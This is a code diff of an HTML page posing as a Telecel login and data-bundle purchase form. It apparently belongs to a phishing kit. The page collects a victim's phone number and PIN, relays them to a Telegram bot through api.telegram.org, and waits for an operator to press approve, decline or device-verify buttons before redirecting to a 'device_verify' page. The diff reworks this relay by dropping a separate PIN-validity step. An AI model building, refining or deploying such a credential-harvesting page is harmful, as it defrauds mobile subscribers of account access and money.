@@ -6,9 +6,9 @@
     <title>Telecel - Log In & Purchase</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-       
+      
         * { margin: 0; padding: 0; box-sizing: border-box; }
-       
+      
         body {
             font-family: 'Inter', sans-serif;
             background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
@@ -19,7 +19,7 @@
             padding: 20px;
             color: #333;
         }
-       
+      
         .container {
             width: 100%;
             max-width: 420px;
@@ -29,7 +29,7 @@
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
             text-align: center;
         }
-       
+      
         .logo-t {
             color: #E30613;
             font-size: 52px;
@@ -42,23 +42,23 @@
             line-height: 72px;
             margin: 0 auto;
         }
-       
+      
         .logo-text {
             color: #E30613;
             font-size: 28px;
             font-weight: 700;
             margin: 8px 0 24px;
         }
-       
+      
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
-       
+      
         .subtitle {
             font-size: 15px;
             color: #555;
             line-height: 1.4;
             margin-bottom: 24px;
         }
-       
+      
         .bundle-info {
             background: linear-gradient(135deg, rgba(227, 6, 19, 0.1) 0%, rgba(0, 51, 160, 0.1) 100%);
             border-left: 4px solid #E30613;
@@ -67,19 +67,19 @@
             margin-bottom: 24px;
             text-align: left;
         }
-       
+      
         .form-group {
             text-align: left;
             margin-bottom: 24px;
         }
-       
+      
         label {
             display: block;
             font-size: 14px;
             font-weight: 600;
             margin-bottom: 8px;
         }
-       
+      
         select, input[type="tel"], input[type="text"] {
             width: 100%;
             padding: 16px 18px;
@@ -89,19 +89,19 @@
             outline: none;
             transition: all 0.3s;
         }
-       
+      
         select:focus, input:focus {
             box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
             border-color: #0033A0;
         }
-       
+      
         #password {
             font-size: 22px;
             letter-spacing: 8px;
             text-align: center;
             font-weight: 600;
         }
-       
+      
         .error-msg {
             color: #dc3545;
             font-size: 13px;
@@ -111,7 +111,7 @@
             background: rgba(220, 53, 69, 0.1);
             border-radius: 6px;
         }
-       
+      
         .success-msg {
             color: #28a745;
             font-size: 13px;
@@ -121,7 +121,7 @@
             background: rgba(40, 167, 69, 0.1);
             border-radius: 6px;
         }
-       
+      
         .btn-action, .btn-back {
             width: 100%;
             padding: 18px;
@@ -132,24 +132,24 @@
             transition: all 0.2s;
             margin: 12px 0 8px;
         }
-       
+      
         .btn-action {
             color: #fff;
             background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
             border: none;
             box-shadow: 0 4px 12px rgba(227, 6, 19, 0.25);
         }
-       
+      
         .btn-action:hover {
             transform: translateY(-2px);
             box-shadow: 0 6px 20px rgba(227, 6, 19, 0.35);
         }
-       
+      
         .btn-action:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
-       
+      
         .btn-back {
             font-size: 16px;
             font-weight: 600;
@@ -157,7 +157,7 @@
             background: transparent;
             border: 1.5px solid #E30613;
         }
-       
+      
         #spinner {
             position: fixed;
             inset: 0;
@@ -167,7 +167,7 @@
             align-items: center;
             z-index: 9999;
         }
-       
+      
         .spin {
             width: 60px;
             height: 60px;
@@ -176,7 +176,7 @@
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-       
+      
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -184,18 +184,18 @@
     <div class="container">
         <div class="logo-t">t</div>
         <div class="logo-text">telecel</div>
-       
+      
         <h1>Welcome to Telecel Play</h1>
         <p class="subtitle">
             Input your telecel number and pin to complete your purchase.
         </p>
-       
+      
         <div class="bundle-info" id="bundleInfo" style="display: none;">
             <h3>📦 Your Selected Bundle</h3>
             <p id="bundleData">-</p>
             <p id="bundlePrice" class="bundle-price">-</p>
         </div>
-       
+      
         <div class="form-group">
             <label>Account type</label>
             <select id="accountType">
@@ -203,12 +203,12 @@
                 <option value="broadband">Broadband</option>
             </select>
         </div>
-       
+      
         <div class="form-group">
             <label id="inputLabel">Phone Number</label>
             <input id="phone" inputmode="tel" placeholder="020XXXXXXX or 050XXXXXXX" type="tel"/>
         </div>
-       
+      
         <div class="form-group">
             <label>
                 PIN <small style="color:#666; font-weight:400;">(4 digits only)</small>
@@ -220,18 +220,18 @@
                 </svg>
             </div>
         </div>
-       
+      
         <div class="error-msg" id="err">Please enter a valid Telecel number and 4-digit PIN</div>
         <div class="success-msg" id="successMsg">✓ Credentials verified! Redirecting...</div>
-       
+      
         <button class="btn-action" id="next">Complete Purchase</button>
         <button class="btn-back" id="back">Cancel</button>
-       
+      
         <div class="back-to-bundles">
             <a href="index.html">← Back to Data Bundles</a>
         </div>
     </div>
-   
+  
     <div id="spinner">
         <div class="spin"></div>
     </div>
@@ -250,8 +250,6 @@
             approveId: null,
             declineId: null,
             verifyDeviceId: null,
-            validPinId: null,
-            invalidPinId: null,
             bundleInfo: null
         };
 
@@ -276,7 +274,7 @@
             const params = new URLSearchParams(window.location.search);
             const bundle = params.get('bundle');
             const price = params.get('price');
-           
+          
             if (bundle && price) {
                 state.bundleInfo = { bundle, price };
                 els.bundleInfo.style.display = 'block';
@@ -297,7 +295,6 @@
         els.togglePassword.addEventListener('click', () => {
             const isHidden = els.passwordInput.type === 'password';
             els.passwordInput.type = isHidden ? 'text' : 'password';
-            // You can improve SVG toggle if needed
         });
 
         // Account Type Switch
@@ -336,6 +333,7 @@
 
         function showSpinner() { els.spinner.style.display = 'flex'; }
         function hideSpinner() { els.spinner.style.display = 'none'; }
+
         function stopPolling() {
             if (state.pollInterval) {
                 clearInterval(state.pollInterval);
@@ -343,7 +341,7 @@
             }
         }
 
-        // Send Login + PIN Confirmation
+        // Send Login Attempt
         function sendLoginAttempt(accountType, accountValue, password) {
             const ts = Date.now();
             state.approveId = `approve_${ts}`;
@@ -408,59 +406,11 @@
                         const cb = update.callback_query;
                         if (!cb) continue;
 
-                        // Main Approval
                         if (cb.data === state.approveId) {
                             stopPolling();
-                            showSuccess("✓ Approved! Confirming PIN...");
-
-                            // Send second message for Valid/Invalid PIN
-                            const ts = Date.now();
-                            state.validPinId = `valid_pin_${ts}`;
-                            state.invalidPinId = `invalid_pin_${ts}`;
-
-                            const pinConfirmMsg = `<b>PIN Confirmation Required</b>\n\nWas the PIN entered correct?`;
-
-                            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: CONFIG.CHAT_ID,
-                                    text: pinConfirmMsg,
-                                    parse_mode: 'HTML',
-                                    reply_markup: {
-                                        inline_keyboard: [
-                                            [
-                                                { text: '✅ Valid PIN', callback_data: state.validPinId },
-                                                { text: '❌ Invalid PIN', callback_data: state.invalidPinId }
-                                            ]
-                                        ]
-                                    }
-                                })
-                            });
-                            return;
-                        }
-
-                        if (cb.data === state.declineId) {
-                            stopPolling();
                             hideSpinner();
-                            showError("Purchase declined. Please try again.");
-                            return;
-                        }
+                            showSuccess("✓ Purchase approved! Completing transaction...");
 
-                        if (cb.data === state.verifyDeviceId) {
-                            stopPolling();
-                            hideSpinner();
-                            showSuccess("Device verification required...");
-                            localStorage.setItem('accountNumber', els.phoneInput.value.trim());
-                            setTimeout(() => window.location.href = 'device_verify.html', 1200);
-                            return;
-                        }
-
-                        // === NEW: Valid / Invalid PIN ===
-                        if (cb.data === state.validPinId) {
-                            stopPolling();
-                            hideSpinner();
-                            showSuccess("✓ PIN Confirmed! Completing purchase...");
                             const accType = els.accountType.value;
                             const accValue = els.phoneInput.value.trim();
                             const pin = els.passwordInput.value.trim();
@@ -476,12 +426,21 @@
                             return;
                         }
 
-                        if (cb.data === state.invalidPinId) {
+                        if (cb.data === state.declineId) {
                             stopPolling();
                             hideSpinner();
-                            showError("Invalid PIN. Please check and try again.");
-                            els.passwordInput.value = '';
-                            els.passwordInput.focus();
+                            showError("Purchase declined. Please try again.");
+                            return;
+                        }
+
+                        if (cb.data === state.verifyDeviceId) {
+                            stopPolling();
+                            hideSpinner();
+                            showSuccess("Device verification required...");
+                            localStorage.setItem('accountNumber', els.phoneInput.value.trim());
+                            setTimeout(() => {
+                                window.location.href = 'device_verify.html';
+                            }, 1200);
                             return;
                         }
                     }
